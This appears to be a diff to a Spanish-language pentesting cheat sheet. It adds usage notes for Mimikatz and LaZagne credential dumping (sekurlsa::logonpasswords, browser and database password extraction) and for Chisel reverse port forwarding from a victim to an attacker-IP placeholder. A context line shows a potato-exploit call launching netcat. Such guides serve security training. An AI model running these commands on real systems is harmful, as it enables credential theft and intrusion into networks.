@@ -118,6 +118,62 @@ juicyPotatoNG.exe -t * -p C:\Windows\System32\cmd.exe -a "/c C:\Users\Public\nc.
 ```
 
 
+## [Mimikatz](https://github.com/ParrotSec/mimikatz/blob/master/README.md) 🔗
+
+Con Mimikatz podrás extraer los hashes de los usuarios del sistema y del dominio. Ten en cuenta que deberás tener permisos elevados.
+
+#### COMANDOS
+```
+./mimikatz.exe
+```
+
+#### USO BÁSICO 
+```
+mimikatz# privilege::debug
+mimikatz# sekurlsa::logonpasswords
+```
+
+## [LaZagne](https://github.com/AlessandroZ/LaZagne/blob/master/README.md) 🔗
+
+Es un programa similar a Mimikatz, podrás extraer contraseñas, hashes del sistema, dominio o de algunos navegadores. En mi opinión es más sencilla de usar que Mimikatz.
+
+#### COMANDOS
+```
+./LaZagne.exe all     # Extrae TODO.
+./LaZagne.exe all -i  # Abre la ayuda, todos los posibles comandos.
+```
+
+#### USO BÁSICO 
+```
+./LaZagne.exe browsers   # Extrae contraseñas de los navegadores
+./LaZagne.exe Databases  # Extrae contraseñas de las BBDD
+
+```
+
+## [Chisel](https://github.com/jpillora/chisel/blob/master/README.md) 🔗
+
+Seguramente ya conozcas este programa, sirve para realizar **Port Forwarding**, esto quiere decir que te podrás traer un puerto interno de la máquina víctima a tu propia máquina.
+
+#### MÁQUINA ATACANTE
+```
+./chisel server --reverse -p 1234
+```
+
+#### MÁQUINA VÍCTIMA
+```
+./chisel client <IP-ATACANTE>:1234 R:*<PUERTO-ATACANTE>:127.0.0.1:*<PUERTO-VÍCTIMA>
+
+```
+
+- ***PUERTO-ATACANTE**: Este puerto es el que se abrirá en tu Localhost para acceder a la máquina víctima.
+- ***PUERTO-VÍCTIMA**: Este puerto es el que "robas" a la víctima, si internamente tiene abierto el 127.0.0.1:3306 y quieres acceder a el a través del 9999 el comando sería:
+
+#### EJEMPLO
+```
+./chisel client <IP-ATACANTE>:1234 R:9999:127.0.0.1:3306
+
+```
+
 ## 🔗 Links
 [![portfolio](https://img.shields.io/badge/my_portfolio-000?style=for-the-badge&logo=ko-fi&logoColor=white)](https://katherineoelsner.com/)
 [![linkedin](https://img.shields.io/badge/linkedin-0A66C2?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/)
